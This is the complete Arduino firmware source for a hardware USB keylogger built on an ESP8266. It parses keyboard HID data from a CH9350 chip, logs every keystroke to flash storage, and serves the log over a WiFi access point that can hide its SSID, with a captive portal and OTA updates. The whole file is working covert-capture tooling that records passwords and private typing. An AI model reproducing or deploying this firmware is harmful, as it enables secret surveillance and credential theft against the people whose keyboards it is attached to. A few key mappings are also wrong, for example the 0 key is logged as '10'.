/************************************** INFO ***********************************
* File Name          : USBkeylogger.ino
* Author             : PushEAX
* Version            : V1.1
* Date               : 2022-11-13
* Last Modified      : 2023-11-22
* Description        : USBKeylogger V1/V2 Firmware
*                      1. Serial read CH9350 messages, parse key value data, save to SPIFFS
*                      2. Web interface / configuration page / OTA upgrade
*******************************************************************************/
#include <FS.h>
#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ESPAsyncDNSServer.h>
#include <ArduinoOTA.h>
#include <ArduinoJson.h>
#include "html.h"

// =======Config=======
String Version = "1.1";
String logFile_Path = "/keyLog.txt";
String configFile_Path = "/config.json";
IPAddress IPAddr(192, 168, 5, 1);
IPAddress subnet(255, 255, 255, 0);
AsyncWebServer webServer(80); // Web server bound to port 80
struct Config {
  const char *AP_SSID = "USBKeylogger";
  const char *AP_password = "12345678";
  const char *AP_hidssid = "0";
  const char *STA_SSID = "Your_Router_SSID";
  const char *STA_password = "Your_Router_Password";
};
Config cfg;
// =======Config=======

FSInfo SPIFFS_Info;
File logFile;
bool rebootFlag = false;
int CH9350HidData[8] = {0,0,0,0,0,0,0,0};
int CH9350HidData_Old[8] = {0,0,0,0,0,0,0,0};
char keyValue[32] = "";
bool capslock = false;

AsyncDNSServer dnsServer;

void setup() {
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  SPIFFS.begin();
  SPIFFS.info(SPIFFS_Info);
  
  logFile = SPIFFS.open(logFile_Path, "a+");
  logFile.print("==boot==\n");

  if (!SPIFFS.exists(configFile_Path)){ // If the configuration file does not exist, write out the default cfg
    DynamicJsonDocument doc(512);
    JsonObject root = doc.to<JsonObject>();
    root["AP_SSID"] = cfg.AP_SSID;
    root["AP_password"] = cfg.AP_password;
    root["AP_hidssid"] = cfg.AP_hidssid;
    root["STA_SSID"] = cfg.STA_SSID;
    root["STA_password"] = cfg.STA_password;
    File configFile = SPIFFS.open(configFile_Path, "w");
    serializeJson(doc, configFile);
    configFile.close();
  }
  else{ // If a configuration file exists, read it to override the default cfg
    StaticJsonDocument<512> doc;
    File configFile = SPIFFS.open(configFile_Path, "r");
    deserializeJson(doc, configFile);
    configFile.close();

    if (doc.containsKey("AP_SSID") && doc.containsKey("AP_password") &&
        doc.containsKey("AP_hidssid") && doc.containsKey("STA_SSID") &&
        doc.containsKey("STA_password")) {
      cfg.AP_SSID = doc["AP_SSID"];
      cfg.AP_password = doc["AP_password"];
      cfg.AP_hidssid = doc["AP_hidssid"];
      cfg.STA_SSID = doc["STA_SSID"];
      cfg.STA_password = doc["STA_password"];
    }else{
      SPIFFS.remove(configFile_Path);
      ESP.restart();
    }
  }
  ArduinoOTA.begin();
  startWiFi();
  startWebInterface();
}

void loop() {
  if(rebootFlag) {
    logFile.print("\n");
    logFile.close();
    yield();
    delay(100);
    ESP.restart();
  }
  //CH9350 Key Data Example:57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
  if (Serial.read() == 0x12){
    delay(5);
    if (Serial.read() == 0x01){
      delay(5);
      for (int i=0;i<7;i++){
        CH9350HidData_Old[i]=CH9350HidData[i];
        CH9350HidData[i]=Serial.read();
        if (CH9350HidData[i]==0x39) capslock=!capslock; // If the Capslock key is pressed, toggle the caps lock state
        delay(5);
      }
      HID2ASCII(CH9350HidData_Old,CH9350HidData,capslock,keyValue);
      logFile.print(keyValue);
      keyValue[0]='\0';
    }
  }
}

void startWiFi(){
  WiFi.mode(WIFI_AP_STA);
  WiFi.hostname("USBKeylogger");
  WiFi.softAPConfig(IPAddr, IPAddr, subnet);
  WiFi.softAP(cfg.AP_SSID,cfg.AP_password,2,(int)cfg.AP_hidssid); // Channel 2
  WiFi.begin(cfg.STA_SSID,cfg.STA_password);
}

void startWebInterface(){
  webServer.on("/", HTTP_GET, [](AsyncWebServerRequest *request){request->send_P(200, "text/html", HTML_Index, templateProcessor);});
  webServer.on("/log", HTTP_GET, [](AsyncWebServerRequest *request){request->send(SPIFFS, logFile_Path, "text/plain");});
  webServer.on("/log.txt", HTTP_GET, [](AsyncWebServerRequest *request){request->send(SPIFFS, logFile_Path, String(), true);});
  webServer.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request){request->send_P(200, "image/x-icon", ICO_Favicon, ICO_Favicon_Len);});
  webServer.on("/common.js", HTTP_GET, [](AsyncWebServerRequest *request){request->send_P(200, "text/html", JS_Common, templateProcessor);});
  webServer.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){request->send_P(200, "text/html", HTML_Index, templateProcessor);}); //Captive Portal on Android
  webServer.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){request->send_P(200, "text/html", HTML_Index, templateProcessor);}); //Captive Portal on Windows
  webServer.onNotFound([](AsyncWebServerRequest *request){request->send(404, "text/html", "<head><script src='common.js'></script></head>Page Not found<br><br><button type='button' onclick=\"location.href='/'\">Back to index</button>");});

  webServer.on("/clearConfirm", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<head><script src='common.js'></script></head>Are you sure?<br><br>You should download the logfile before delete it.<br><br><button type='button' onclick=\"location.href='/clear'\">Yes,delete it</button><br><button type='button' onclick=\"location.href='/'\">No</button>");
  });
  webServer.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    logFile.close();
    logFile = SPIFFS.open(logFile_Path, "w");
    request->send(200, "text/html", "<head><script src='common.js'></script></head>Logfile cleared!<br><br><button type='button' onclick=\"location.href='/'\">Back to index</button>");
  });
  
  webServer.on("/settings", HTTP_GET, [](AsyncWebServerRequest *request){
    if(request->hasParam("save")){
      String AP_SSID = request->arg("AP_SSID");
      String AP_password = request->arg("AP_password");
      String AP_hidssid = request->arg("AP_hidssid");
      String STA_SSID = request->arg("STA_SSID");
      String STA_password = request->arg("STA_password");
      
      DynamicJsonDocument doc(512);
      JsonObject root = doc.to<JsonObject>();
      root["AP_SSID"] = AP_SSID;
      root["AP_password"] = AP_password;
      root["AP_hidssid"] = AP_hidssid;
      root["STA_SSID"] = STA_SSID;
      root["STA_password"] = STA_password;
      File configFile = SPIFFS.open(configFile_Path, "w");
      serializeJson(doc, configFile);
      configFile.close();
      
      AsyncResponseStream *response = request->beginResponseStream("text/html");
      response->printf("<head><script src='common.js'></script></head>Config Saved. <br><br><button type='button' onclick=\"location.href='/'\">Back to index</button>");
      request->send(response);
      rebootFlag = 1;
    }
    else request->send_P(200, "text/html", HTML_Settings, templateProcessor);
  });

  webServer.on("/reboot", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<head><script src='common.js'></script></head>Rebooting<br><br><button type='button' onclick=\"location.href='/'\">Back to index</button>");
    rebootFlag = 1;
  });

  // Handle OTA update
  webServer.on("/update", HTTP_POST, [](AsyncWebServerRequest *request){
    AsyncWebServerResponse *response = request->beginResponse(200, "text/plain", (Update.hasError())?"Update fail":"Update Success!\nRebooting...");
    rebootFlag = 1;
    request->send(response);
  }, [](AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final){
    if(!index){
      Serial.printf("UploadStart: %s\n", filename.c_str());
      uint32_t maxSketchSpace = (ESP.getFreeSketchSpace() - 0x1000) & 0xFFFFF000;
      if(!Update.begin(maxSketchSpace)){
        Update.printError(Serial);
      }
      Update.runAsync(true);
    }

    if(Update.write(data, len) != len){
      Update.printError(Serial);
    }

    if(final){
      if(Update.end(true)){
        Serial.printf("Update Success: %u B\nRebooting...\n", index+len);
      } else {
        Update.printError(Serial);
      }
    }
  });

  webServer.begin();
  dnsServer.start(53, "*", IPAddr); // Parse all DNS requests to here, used for Captive Portal
}

String templateProcessor(const String& var) { // Process HTML template strings
  if(var == "SPIFFSUSAGE") {
    char temp[64];
    sprintf(temp,"Storage Usage: %.2f KBytes / %d KBytes", SPIFFS_Info.usedBytes/1024.0, SPIFFS_Info.totalBytes/1024);
    return temp;
  }

  StaticJsonDocument<512> doc;
    File configFile = SPIFFS.open(configFile_Path, "r");
    deserializeJson(doc, configFile);
    configFile.close();
   
  if(var == "AP_SSID") return doc["AP_SSID"];
  if(var == "AP_password") return doc["AP_password"];
  if(var == "SHOWSSID") return (doc["AP_hidssid"] == "1")?"":"checked";
  if(var == "HIDSSID") return (doc["AP_hidssid"] == "1")?"checked":"";
  if(var == "STA_SSID") return doc["STA_SSID"];
  if(var == "STA_password") return doc["STA_password"];
  if(var == "FIRMWAREVERSION") return Version;
  
  return var;
}

/*
Compare two sets of HID data and output new keystrokes in ASCII form

HIDData_old: Keyboard data from the previous input
HIDData: 8-byte keyboard HID data, e.g., 0x00,0x00,0x04,0x0c,0x03,0x06,0x28,0x49
capslock: Caps lock status
result: char* to receive return value
*/
#define GET_BIT(byte2process, bit_pos)  ((byte2process & (1 << bit_pos)) >> bit_pos)  // Get the bit at bit_pos position of a specific Byte
void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
{
  int shift=GET_BIT(HIDData[0],1) || GET_BIT(HIDData[0],5); // State of the shift key
  
  // Parsing byte0, state of the function keys
  if(!GET_BIT(HIDData_old[0],0)&&GET_BIT(HIDData[0],0) || !GET_BIT(HIDData_old[0],4)&&GET_BIT(HIDData[0],4)) strcat(result,"[Ctrl]");
  if(!GET_BIT(HIDData_old[0],1)&&GET_BIT(HIDData[0],1) || !GET_BIT(HIDData_old[0],5)&&GET_BIT(HIDData[0],5)) strcat(result,"[Shift]");
  if(!GET_BIT(HIDData_old[0],2)&&GET_BIT(HIDData[0],2) || !GET_BIT(HIDData_old[0],6)&&GET_BIT(HIDData[0],6)) strcat(result,"[Alt]");
  if(!GET_BIT(HIDData_old[0],3)&&GET_BIT(HIDData[0],3) || !GET_BIT(HIDData_old[0],7)&&GET_BIT(HIDData[0],7)) strcat(result,"[Win]"); 
  
  for(int i=2;i<8;i++)
  {
    if(HIDData[i]!=HIDData_old[i] && HIDData[i]!=HIDData_old[i+1])
    {
      switch(HIDData[i])
      {
        case 0x00:return;
        case 0x04:
          if (!capslock && !shift) strcat(result,"a");  // Lowercase if caps lock is off and shift is not pressed
          if (!capslock && shift) strcat(result,"A");   // Uppercase if only shift is pressed
          if (capslock && !shift) strcat(result,"A");   // Uppercase if only caps lock is on
          if (capslock && shift) strcat(result,"a");    // Lowercase if both caps lock is on and shift is pressed
          break;
        case 0x05:
          if (!capslock && !shift) strcat(result,"b");
          if (!capslock && shift) strcat(result,"B");
          if (capslock && !shift) strcat(result,"B");
          if (capslock && shift) strcat(result,"b");
          break;
        case 0x06:
          if (!capslock && !shift) strcat(result,"c");
          if (!capslock && shift) strcat(result,"C");
          if (capslock && !shift) strcat(result,"C");
          if (capslock && shift) strcat(result,"c");
          break;
        case 0x07:
          if (!capslock && !shift) strcat(result,"d");
          if (!capslock && shift) strcat(result,"D");
          if (capslock && !shift) strcat(result,"D");
          if (capslock && shift) strcat(result,"d");
          break;
        case 0x08:
          if (!capslock && !shift) strcat(result,"e");
          if (!capslock && shift) strcat(result,"E");
          if (capslock && !shift) strcat(result,"E");
          if (capslock && shift) strcat(result,"e");
          break;
        case 0x09:
          if (!capslock && !shift) strcat(result,"f");
          if (!capslock && shift) strcat(result,"F");
          if (capslock && !shift) strcat(result,"F");
          if (capslock && shift) strcat(result,"f");
          break;
        case 0x0A:
          if (!capslock && !shift) strcat(result,"g");
          if (!capslock && shift) strcat(result,"G");
          if (capslock && !shift) strcat(result,"G");
          if (capslock && shift) strcat(result,"g");
          break;
        case 0x0B:
          if (!capslock && !shift) strcat(result,"h");
          if (!capslock && shift) strcat(result,"H");
          if (capslock && !shift) strcat(result,"H");
          if (capslock && shift) strcat(result,"h");
          break;
        case 0x0C:
          if (!capslock && !shift) strcat(result,"i");
          if (!capslock && shift) strcat(result,"I");
          if (capslock && !shift) strcat(result,"I");
          if (capslock && shift) strcat(result,"i");
          break;
        case 0x0D:
          if (!capslock && !shift) strcat(result,"j");
          if (!capslock && shift) strcat(result,"J");
          if (capslock && !shift) strcat(result,"J");
          if (capslock && shift) strcat(result,"j");
          break;
        case 0x0E:
          if (!capslock && !shift) strcat(result,"k");
          if (!capslock && shift) strcat(result,"K");
          if (capslock && !shift) strcat(result,"K");
          if (capslock && shift) strcat(result,"k");
          break;
        case 0x0F:
          if (!capslock && !shift) strcat(result,"l");
          if (!capslock && shift) strcat(result,"L");
          if (capslock && !shift) strcat(result,"L");
          if (capslock && shift) strcat(result,"l");
          break;
        case 0x10:
          if (!capslock && !shift) strcat(result,"m");
          if (!capslock && shift) strcat(result,"M");
          if (capslock && !shift) strcat(result,"M");
          if (capslock && shift) strcat(result,"m");
          break;
        case 0x11:
          if (!capslock && !shift) strcat(result,"n");
          if (!capslock && shift) strcat(result,"N");
          if (capslock && !shift) strcat(result,"N");
          if (capslock && shift) strcat(result,"n");
          break;
        case 0x12:
          if (!capslock && !shift) strcat(result,"o");
          if (!capslock && shift) strcat(result,"O");
          if (capslock && !shift) strcat(result,"O");
          if (capslock && shift) strcat(result,"o");
          break;
        case 0x13:
          if (!capslock && !shift) strcat(result,"p");
          if (!capslock && shift) strcat(result,"P");
          if (capslock && !shift) strcat(result,"P");
          if (capslock && shift) strcat(result,"p");
          break;
        case 0x14:
          if (!capslock && !shift) strcat(result,"q");
          if (!capslock && shift) strcat(result,"Q");
          if (capslock && !shift) strcat(result,"Q");
          if (capslock && shift) strcat(result,"q");
          break;
        case 0x15:
          if (!capslock && !shift) strcat(result,"r");
          if (!capslock && shift) strcat(result,"R");
          if (capslock && !shift) strcat(result,"R");
          if (capslock && shift) strcat(result,"r");
          break;
        case 0x16:
          if (!capslock && !shift) strcat(result,"s");
          if (!capslock && shift) strcat(result,"S");
          if (capslock && !shift) strcat(result,"S");
          if (capslock && shift) strcat(result,"s");
          break;
        case 0x17:
          if (!capslock && !shift) strcat(result,"t");
          if (!capslock && shift) strcat(result,"T");
          if (capslock && !shift) strcat(result,"T");
          if (capslock && shift) strcat(result,"t");
          break;
        case 0x18:
          if (!capslock && !shift) strcat(result,"u");
          if (!capslock && shift) strcat(result,"U");
          if (capslock && !shift) strcat(result,"U");
          if (capslock && shift) strcat(result,"u");
          break;
        case 0x19:
          if (!capslock && !shift) strcat(result,"v");
          if (!capslock && shift) strcat(result,"V");
          if (capslock && !shift) strcat(result,"V");
          if (capslock && shift) strcat(result,"v");
          break;
        case 0x1A:
          if (!capslock && !shift) strcat(result,"w");
          if (!capslock && shift) strcat(result,"W");
          if (capslock && !shift) strcat(result,"W");
          if (capslock && shift) strcat(result,"w");
          break;
        case 0x1B:
          if (!capslock && !shift) strcat(result,"x");
          if (!capslock && shift) strcat(result,"X");
          if (capslock && !shift) strcat(result,"X");
          if (capslock && shift) strcat(result,"x");
          break;
        case 0x1C:
          if (!capslock && !shift) strcat(result,"y");
          if (!capslock && shift) strcat(result,"Y");
          if (capslock && !shift) strcat(result,"Y");
          if (capslock && shift) strcat(result,"y");
          break;
        case 0x1D:
          if (!capslock && !shift) strcat(result,"z");
          if (!capslock && shift) strcat(result,"Z");
          if (capslock && !shift) strcat(result,"Z");
          if (capslock && shift) strcat(result,"z");
          break;
      
        case 0x1E:
          if(shift) strcat(result,"!");
          else strcat(result,"1");
          break;
        case 0x1F:
          if(shift) strcat(result,"@");
          else strcat(result,"2");
          break;
        case 0x20:
          if(shift) strcat(result,"#");
          else strcat(result,"3");
          break;
        case 0x21:
          if(shift) strcat(result,"$");
          else strcat(result,"4");
          break;
        case 0x22:
          if(shift) strcat(result,"%");
          else strcat(result,"5");
          break;
        case 0x23:
          if(shift) strcat(result,"^");
          else strcat(result,"6");
          break;
        case 0x24:
          if(shift) strcat(result,"&");
          else strcat(result,"7");
          break;
        case 0x25:
          if(shift) strcat(result,"*");
          else strcat(result,"8");
          break;
        case 0x26:
          if(shift) strcat(result,"(");
          else strcat(result,"9");
          break;
        case 0x27:
          if(shift) strcat(result,")");
          else strcat(result,"10");
          break;
        case 0x28:strcat(result,"[Enter]\n");
          break;
        case 0x29:strcat(result,"[Esc]");
          break;
        case 0x2A:strcat(result,"[Backsp]");
          break;
        case 0x2B:strcat(result,"[Tab]");
          break;
        case 0x2C:strcat(result," ");
          break;
        case 0x2D:
          if(shift) strcat(result,"_");
          else strcat(result,"-");
          break;
        case 0x2E:
          if(shift) strcat(result,"+");
          else strcat(result,"=");
          break;
        case 0x2F:
          if(shift) strcat(result,"{");
          else strcat(result,"[");
          break;
        case 0x30:
          if(shift) strcat(result,"}");
          else strcat(result,"]");
          break;
        case 0x31:
          if(shift) strcat(result,"(|");
          else strcat(result,"\\");
          break;
        case 0x32:
          if(shift) strcat(result,"~");
          else strcat(result,"`");
          break;
        case 0x33:
          if(shift) strcat(result,":");
          else strcat(result,";");
          break;
        case 0x34:
          if(shift) strcat(result,"\"");
          else strcat(result,"\"");
          break;
        case 0x35:
          if(shift) strcat(result,"`");
          else strcat(result,"~");
          break;
        case 0x36:
          if(shift) strcat(result,"<");
          else strcat(result,",");
          break;
        case 0x37:
          if(shift) strcat(result,">");
          else strcat(result,".");
          break;
        case 0x38:
          if(shift) strcat(result,"?");
          else strcat(result,"/");
          break;
      
      
        case 0x39:strcat(result,"[Capslock]");
          break;
        case 0x3A:strcat(result,"[F1]");
          break;               
        case 0x3B:strcat(result,"[F2]");
          break;               
        case 0x3C:strcat(result,"[F3]");
          break;               
        case 0x3D:strcat(result,"[F4]");
          break;               
        case 0x3E:strcat(result,"[F5]");
          break;               
        case 0x3F:strcat(result,"[F6]");
          break;               
        case 0x40:strcat(result,"[F7]");
          break;               
        case 0x41:strcat(result,"[F8]");
          break;               
        case 0x42:strcat(result,"[F9]");
          break;               
        case 0x43:strcat(result,"[F10]");
          break;               
        case 0x44:strcat(result,"[F11]");
          break;               
        case 0x45:strcat(result,"[F12]");
          break;
        case 0x46:strcat(result,"[PrintScreen]");
          break;
        case 0x47:strcat(result,"[Scolllock]");
          break;
        case 0x48:strcat(result,"[Pause]");
          break;
        case 0x49:strcat(result,"[Ins]");
          break;
        case 0x4A:strcat(result,"[Home]");
          break;
        case 0x4B:strcat(result,"[Pageup]");
          break;
        case 0x4C:strcat(result,"[Del]");
          break;
        case 0x4D:strcat(result,"[End]");
          break;
        case 0x4E:strcat(result,"[Pagedown]");
          break;
        case 0x4F:strcat(result,"[Right]");
          break;
        case 0x50:strcat(result,"[Left]");
          break;
        case 0x51:strcat(result,"[Down]");
          break;
        case 0x52:strcat(result,"[Up]");
          break;
        case 0x53:strcat(result,"[Numlock]");
          break;
        case 0x54:strcat(result,"/");
          break;
        case 0x55:strcat(result,"*");
          break;
        case 0x56:strcat(result,"-");
          break;
        case 0x57:strcat(result,"+");
          break;
        case 0x58:strcat(result,"[Enter]\n");
          break;
        case 0x59:strcat(result,"1");
          break;
        case 0x5A:strcat(result,"2");
          break;
        case 0x5B:strcat(result,"3");
          break;
        case 0x5C:strcat(result,"4");
          break;
        case 0x5D:strcat(result,"5");
          break;
        case 0x5E:strcat(result,"6");
          break;
        case 0x5F:strcat(result,"7");
          break;
        case 0x60:strcat(result,"8");
          break;
        case 0x61:strcat(result,"9");
          break;
        case 0x62:strcat(result,"0");
          break;
        case 0x63:strcat(result,".");
          break;
        }
    }
  }
}
